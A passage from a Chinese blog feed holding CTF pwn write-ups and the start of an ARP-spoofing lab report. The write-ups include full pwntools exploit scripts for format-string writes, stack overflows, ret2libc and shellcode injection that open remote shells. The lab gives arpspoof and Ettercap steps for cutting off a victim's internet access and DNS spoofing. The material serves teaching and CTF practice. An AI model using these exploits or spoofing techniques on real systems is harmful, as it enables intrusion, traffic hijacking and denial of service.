<li><p>在message中输入<code>aaaa-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x</code>，由于<code>printf(%s)</code>，所以输入的内容会在显示在命令行中，查看输出结果如下；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127184609.png" style="zoom:50%;"></li>
<li><p> 输出结果中中<code>61616161</code>是<code>aaaa</code>的十六进制ACSII编码，在第10个位置，因此偏移量为10；</p>
</li>
</ol>
</li>
<li><p>构造payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload = p32(pwnme_addr)+ <span class="string">'aaaa'</span> + <span class="string">'%10$n'</span></span><br></pre></td></tr></table></figure>

<p> pwnme的地址需要经过32位编码转换，四位，而要求pwnme等于8，所以加上<code>aaaa</code>；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>,<span class="number">62194</span>)</span><br><span class="line"><span class="comment"># p = process('./CGfsb')</span></span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload = p32(pwnme_addr)+ <span class="string">'aaaa'</span> + <span class="string">'%10$n'</span></span><br><span class="line">p.sendline(<span class="string">'leeyuxun'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行paylaod,成功拿到flag；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127185953.png" style="zoom:50%;"></li>
</ol>
</li>
</ol>
<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>栈溢出，覆盖变量！</p>
<ol>
<li><p>checksec查看，开启RELOR、NX和栈保护；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309171152.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p>main()函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309171527.png" style="zoom:50%;"></li>
<li><p>分析；</p>
<ol>
<li> 程序要求先输入Birth，限制不能为1926；</li>
<li> 然后输入名字，使用<code>gets()</code>函数；</li>
<li> 输入完名字后判断Birth是否为1926，只有是1926才会执行<code>cat flag</code>；</li>
<li> <code>gets()</code>函数存在站溢出漏洞，只需输入名字<code>v4</code>时覆盖Birth即<code>v5</code>即可，这里<code>v4</code>和<code>v5</code>之间的距离为<code>0x08</code>；</li>
</ol>
</li>
</ol>
</li>
<li><p>构造payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">born = <span class="number">1926</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p32(born)</span><br></pre></td></tr></table></figure>

<p> 最终payload为</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">42505</span>)</span><br><span class="line"><span class="comment">#p = process('./when_did_you_born')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">born = <span class="number">1926</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p32(born)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，成功拿到flag；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309172717.png" style="zoom:50%;"></li>
</ol>
<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>栈溢出，覆盖返回地址！</p>
<ol>
<li><p>checksec查看，开启了NX；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309192516.png" style="zoom:50%;"></li>
<li><p>放入IDA分析；</p>
<ol>
<li><p><code>main()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309192857.png" style="zoom:50%;"></li>
<li><p><code>vulnerable_function()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309192932.png" style="zoom:50%;"></li>
<li><p><code>callsystem()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309193014.png" style="zoom:50%;"></li>
<li><p>分析</p>
<ol>
<li><p> <code>main()</code>函数调用<code>vulnerable_function()</code>函数；</p>
</li>
<li><p> <code>vulnerable_function()</code>函数的<code>read()</code>函数最多可读取<code>0x200</code>字节，而buf变量的空间最多容纳<code>0x80</code>字节，此处存在栈溢出漏洞；</p>
</li>
<li><p> <code>callsystem()</code>函数调用了system的<code>/bin/sh</code>，通过覆盖将返回地址改为<code>callsystem()</code>函数地址即可getshell；</p>
</li>
<li><p><code>callsystem()</code>函数地址为<code>0x400596</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309194552.png" style="zoom:50%;"></li>
<li><p><code>vulnerable_function()</code>函数栈空间填充前后内容如下；</p>
<table>
<thead>
<tr>
<th align="center">填充前</th>
<th align="center">填充后</th>
</tr>
</thead>
<tbody><tr>
<td align="center">……</td>
<td align="center">……</td>
</tr>
<tr>
<td align="center">ret</td>
<td align="center">callsystem_addr</td>
</tr>
<tr>
<td align="center">old ebp</td>
<td align="center">‘a’*0x08</td>
</tr>
<tr>
<td align="center">buf</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">……</td>
<td align="center">‘a’*0x80</td>
</tr>
<tr>
<td align="center">buf</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">……</td>
<td align="center">……</td>
</tr>
</tbody></table>
</li>
</ol>
</li>
</ol>
</li>
<li><p>构造payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">38908</span>)</span><br><span class="line"><span class="comment">#p = process('./level0')</span></span><br><span class="line"></span><br><span class="line">callsystem_addr = <span class="number">0x400596</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x80</span>+<span class="number">0x08</span>) + p64(callsystem_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload成功getshell；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309201701.png" style="zoom:50%;"></li>
</ol>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>栈溢出，覆盖返回地址！</p>
<ol>
<li><p>checksec查看，开启RELOR和NX；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310204654.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p><code>main()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310204901.png" style="zoom:50%;"></li>
<li><p><code>vulnerable_function()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310205105.png" style="zoom:50%;"></li>
<li><p>分析；</p>
<ol>
<li><p> 上述两个函数和level0大致相同，栈溢出的溢出点同样在<code>read()</code>函数上；</p>
</li>
<li><p>并且level2调用了<code>system()</code>函数，<code>system()</code>函数的执行地址可以通过EFL命令获得；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">system_addr=elf.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure></li>
<li><p>查看字符串发现<code>/bin/sh</code>命令；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310205604.png" style="zoom:50%;"></li>
<li><p>可以通过<code>read()</code>栈溢出，在返回函数时用<code>system(/bin/sh)</code>覆盖，输入的payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">binsh_addr=elf.search(<span class="string">'/bin/sh'</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) +p32(<span class="number">0</span>) + p32(binsh_addr)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
<li><p>最终payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">37199</span>)</span><br><span class="line"><span class="comment"># p = process('./level2')</span></span><br><span class="line">p.recv()</span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">system_addr=elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr=elf.search(<span class="string">'/bin/sh'</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) +p32(<span class="number">0</span>) + p32(binsh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，成功getshell；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310210511.png" style="zoom:50%;"></li>
</ol>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>libc泄漏，栈溢出，ret2libc！</p>
<ol>
<li><p>checksec查看，开启RELOR和NX；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310213428.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p><code>main()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310213606.png" style="zoom:50%;"></li>
<li><p><code>vulnerable_function()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310213628.png" style="zoom:50%;"></li>
<li><p>分析</p>
<ol>
<li><p> 基本和level2相同，栈溢出的溢出点同样在<code>read()</code>函数上；</p>
</li>
<li><p>但是并没有调用<code>system()</code>函数，给出了libc文件，显然是<strong>ret2libc</strong>；</p>
<blockquote>
<p>  ret2libc即控制函数的执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置，即函数对应的got表项的内容。一般情况下，选择执行<code>system('/bin/sh')</code>，需要知道<code>system()</code>函数的地址；</p>
</blockquote>
</li>
<li><p> 由于调用了<code>write()</code>函数，首先第一次溢出泄露<code>write()</code>的地址，算出<code>libc</code>的基地址，通过偏移进而算出<code>system()</code>函数和<code>/bin/sh</code>的实际地址；</p>
</li>
<li><p> 接着二次溢出，通过计算出的<code>system()</code>函数和<code>/bin/sh</code>的实际地址，覆盖EIP来getShell；</p>
</li>
</ol>
</li>
</ol>
</li>
<li><p>最终payload如下所示；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"111.200.241.244"</span>, <span class="number">58141</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vul_func_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">write_offset = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).<span class="built_in">next</span>()</span><br><span class="line">per_payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x04</span>) + p32(write_plt) + p32(vul_func_addr) + p32(<span class="number">0</span>) + p32(write_got) + <span class="string">'a'</span>*<span class="number">0x04</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(per_payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">libc_base_addr = write_addr - write_offset</span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line">binsh_addr = libc_base_addr + binsh_offset</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x04</span>) + p32(system_addr) + <span class="string">'a'</span>*<span class="number">0x04</span> + p32(binsh_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，成功getshell；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310215656.png" style="zoom:50%;"></li>
</ol>
<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>算是栈溢出吧！</p>
<ol>
<li><p>checksec查看，保护全开；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311141158.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p><code>mian()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311143141.png" style="zoom:50%;"></li>
<li><p><code>sub_C3E()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311143555.png" style="zoom:50%;"></li>
<li><p>分析</p>
<ol>
<li><p> <code>gets()</code>函数存在栈溢出漏洞；</p>
</li>
<li><p> <code>sub_C3E()</code>函数可以实现<code>cat flag</code>命令；</p>
</li>
<li><p> 执行函数<code>sub_C3E()</code>的前提是连续十次猜对生成的随机数；</p>
</li>
<li><p> 只需要覆盖随机数执行的种子seed，按照覆盖的种子生成的随机数输入即可十次全部正确，执行<code>sub_C3E()</code>函数；</p>
</li>
<li><p>查看seed在栈中的位置为<code>rbp-10h</code>，而可以栈溢出的<code>v7</code>在栈中的位置为<code>rbp-30h</code>，二者相差了<code>0x20</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311144812.png" style="zoom:50%;"></li>
<li><p>因此可以构造如下payload实现覆盖seed为0；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
<li><p>按照程序中的方式使用C语言生成以0为seed的十个随机数；</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++){</span><br><span class="line">    	<span class="type">int</span> r = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, r);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311145853.png" style="zoom:50%;"></li>
<li><p>构造最终payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">57646</span>)</span><br><span class="line"><span class="comment"># p = process('./guess_num')</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Your name:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，输入生成的十个随机数，最终执行函数<code>sub_C3E()</code>，获取flag；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311150325.png" style="zoom:50%;"></li>
</ol>
<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>格式化字符串！</p>
<ol>
<li><p>checksec查看，开启RELOR、stack和NX；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311103929.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p><code>main()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311104117.png" style="zoom:50%;">

<ol>
<li> 调用了<code>alarm()</code>函数，设置计时为60s，程序会在60s后退出； </li>
<li> 调用<code>sub_400996()</code>函数和<code>sub_400D72()</code>函数；</li>
<li> 为<code>v3</code>分配8字节的空间，将<code>v3</code>的地址赋值给<code>v4</code>；</li>
<li> 设置<code>v3</code>的前4个字节存放<code>68</code>，后4个字节存放<code>85</code>，并将高低4字节的地址分别以<code>v4</code>的方式打印出来；</li>
</ol>
</li>
<li><p><code>sub_400996()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110109.png" style="zoom:50%;">

<ol>
<li><p>打印提示信息和龙的图案；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110429.png" style="zoom:50%;">

 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110507.png" style="zoom:44%;"></li>
</ol>
</li>
<li><p><code>sub_400D72()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110630.png" style="zoom:50%;">

<ol>
<li> 输入名字，要求长度不超过<code>0x0C</code>个字节，如果大于<code>0x0C</code>，则返回<code>main()</code>函数并退出；</li>
<li> 调用<code>sub_400AD7()</code>函数、<code>sub_400BB9()</code>函数、<code>sub_400CA6()</code>函数；</li>
</ol>
</li>
<li><p><code>sub_400AD7()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311111007.png" style="zoom:50%;">

<ol>
<li> 打印一大串无聊的文字说明，然后让选择<code>east</code>或者<code>up</code>，只能选择<code>east</code>，否则会一直循环下去，直到程序运行结束；</li>
<li> 调用了<code>sub_4009DD()</code>函数；</li>
</ol>
</li>
<li><p><code>sub_4009DD()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311111737.png" style="zoom:50%;">

<ol>
<li> ？？？让循环判断生成的随机数的奇偶性，早晚会<code>exit(0)</code>，显然此处无从下手；</li>
</ol>
</li>
<li><p><code>sub_400BB9()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311112417.png" style="zoom:50%;">

<ol>
<li> 判断输入是否为1，如果不为1，则直接退出该函数；</li>
<li> 如果为1，则需要输入两个参数，其中第一个是地址，然后出现语句<code>printf(&amp;format, &amp;format)</code>，存在格式化字符串漏洞；</li>
</ol>
</li>
<li><p><code>sub_400CA6()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311113012.png" style="zoom:50%;">

<ol>
<li><p> 比较<code>*a1</code>和<code>a1[1]</code>，如果不相等，直接退出结束；</p>
</li>
<li><p> 此处<code>*a1</code>是传递的参数<code>v4</code>即分配的<code>v3</code>的低4位地址，而<code>a1[1]</code>则是<code>v3</code>的高4位地址，正常情况下不相等；</p>
</li>
<li><p> 如果相等，则调用<code>mmap()</code>函数分配一块大小为<code>0x1000</code>字节的空间，其中第三个参数表示该空间可读可写可执行；</p>
</li>
<li><p> 通过<code>read()</code>函数，将输入内容赋值给<code>v1</code>；</p>
</li>
<li><p>接着通过执行如下语句，强制将<code>v1</code>转化为可执行函数；</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *))v1)(<span class="number">0LL</span>, v1);</span><br></pre></td></tr></table></figure></li>
<li><p> 因此只要通过<code>sub_400BB9()</code>函数的格式化字符串漏洞令<code>*a1</code>和<code>a1[1]</code>相等，再利用pwntools自带的shellcraft工具，生成amd64架构下的shellcode，即可获取shell；</p>
</li>
<li><p> 回到<code>sub_400BB9()</code>函数中，在获取format的输入前，获取了一次输入并保存到了<code>v2</code>中，在<code>rsp+8h</code>的位置，如果把 <code>printf()</code>函数的原型记作<code>printf(format, args...)</code>，那么<code>v2</code>恰恰是<code>args</code>中的第7个参数； 在cheksec检查中，发现这是64位的程序，前6个参数放在寄存器中，从第七个参数开始压入栈中，因此可以用<code>%7$n</code>来访问并修改；</p>
</li>
<li><p> 首先将<code>v4</code>即<code>v3</code>的地址赋值给<code>v2</code>，再接着利用格式化字符串漏洞，将<code>v2</code>的值改为<code>85</code>，即<code>*a1</code>和<code>a1[1]</code>相等；</p>
</li>
<li><p><code>v4</code>即<code>v3</code>的地址已经打印出来可以直接获得；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">v4 = <span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>构造的格式化字符串的payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'%85x%7$n'</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
</li>
</ol>
</li>
<li><p>最终payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">44009</span>)</span><br><span class="line"><span class="comment"># p = process('./string')</span></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">v4 = <span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What should your character's name be:"</span>)</span><br><span class="line">p.sendline(<span class="string">"leeyuxun"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"So, where you will go?east or up?:"</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"go into there(1), or leave(0)?:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(v4))</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">'%85x%7$n'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">rec = p.recvuntil(<span class="string">'SPELL\n'</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，成功getshell；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311135444.png" style="zoom:50%;"></li>
</ol>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>ARP欺骗实验</title>
    <url>/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol>
<li>运行<code>Ettercap</code>，扫描在线主机，对目标主机进行<code>禁止上网</code>、<code>DNS欺骗</code>攻击，查看目标主机状态。</li>
<li>通过<code>WireShark</code>抓包工具，捕获<code>ARP欺骗攻击</code>的数据包，分析<code>ARP攻击</code>的原理。</li>
<li>基于<code>Winpcap</code>编写程序，对指定的目标IP地址进行<code>ARP欺骗攻击</code>。<span id="more"></span></li>
</ol>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="“禁止上网”攻击"><a href="#“禁止上网”攻击" class="headerlink" title="“禁止上网”攻击"></a>“禁止上网”攻击</h2><p>Kali攻击机利用<strong>arp欺骗后不进行IP转发</strong>对靶机CentOS进行“禁止上网”攻击</p>
<ol>
<li><p>打开两台虚拟机，利用命令ifconfig查看Kali的网络接口、ip等信息：Kali网络接口为<code>eth0</code>，IP地址为<code>192.168.88.130</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661105370.png" alt="1565661105370"></p>
</li>
<li><p>利用命令ifconfig和route查看CentOS的IP地址和网关：CentOS的IP地址为<code>192.168.88.131</code>，网关为<code>192.168.88.2</code>。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661361464.png" alt="1565661361464"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661161089.png" alt="1565661161089"></p>
</li>
<li><p>攻击机利用Ettercap嗅探目标主机的IP地址和网关，网络接口选择eth0：嗅探到目标主机IP地址为<code>192.168.88.131</code>，网关为<code>192.168.88.2</code>，符合。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661280293.png" alt="1565661280293"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661290669.png" alt="1565661290669"></p>
</li>
<li><p>利用命令行<code>echo 0 &gt; /proc/sys/net/ipv4/ip_forward</code>关闭Kali的IP转发，利用命令行<code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code>     即<code>arpspoof -i eth0</code><br><code>-c host -t 192.168.88.131 -r 192.168.88.2</code>得到靶机发送的消息。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661495435.png" alt="1565661495435"></p>
</li>
<li><p>使用CentOS ping 百度网址<a href="http://www.baidu.com/">www.baidu.com</a>发现无法连接百度，不能上网。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565666177653.png" alt="1565666177653"></p>
</li>
<li><p>利用Ctrl+C使Kali退出arp欺骗。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661553673.png" alt="1565661553673"></p>
</li>
<li><p>使用CentOS ping 百度网址<a href="http://www.baidu.com/">www.baidu.com</a>发现没有丢包，可以上网。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661576848.png" alt="1565661576848"></p>
</li>
</ol>
<h2 id="“DNS欺骗”攻击"><a href="#“DNS欺骗”攻击" class="headerlink" title="“DNS欺骗”攻击"></a>“DNS欺骗”攻击</h2><ol>
<li><p>利用命令<code>/etc/init.d/apache2 start</code>打开kali自带的Apache服务。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661632148.png" alt="1565661632148"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661652172.png" alt="1565661652172"></p>
</li>
<li><p>对<code>etter.dns</code>文件进行修改如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661688492.png" alt="1565661688492"></p>
</li>
<li><p>Kali利用<code>Ettercap</code>进行<code>Unified sniffing</code>嗅探网络接口选择<code>eth0</code>，并在<code>Hosts</code>下选择<code>Scan for hosts</code>，然后选择<code>Hosts list</code>列出主机。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661743998.png" alt="1565661743998"></p>
</li>
<li><p>在<code>Mitm</code>中选择<code>Arp Poisoning</code>，勾选<code>Sniff remote connections</code>开启嗅探。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661839379.png" alt="1565661839379"></p>
</li>
<li><p>在<code>Plugins</code>下打开<code>Manage the plugins</code>，将<code>dns_spoof</code>插件双击选中。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661873307.png" alt="1565661873307"></p>
</li>
<li><p>选择CentOS的IP点击<code>Add to Target1</code>，接着选择CentOS的网关点击<code>Add to Target2</code>，然后点击<code>Start sniffing</code>，DNS欺骗完成。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661925221.png" alt="1565661925221"></p>
</li>
<li><p>使用CentOS ping百度地址<a href="http://www.baidu.com/">www.baidu.com</a>,发现ping到的IP地址为<code>192.168.88.130</code>,即Kali的IP地址,使用浏览器输入淘宝域名<a href="http://www.taobao.com/">www.taobao.com</a>,进入到Kali的<code>localhost页面</code>,表明DNS欺骗攻击成功。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661978661.png" alt="1565661978661"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661988808.png" alt="1565661988808"></p>
</li>
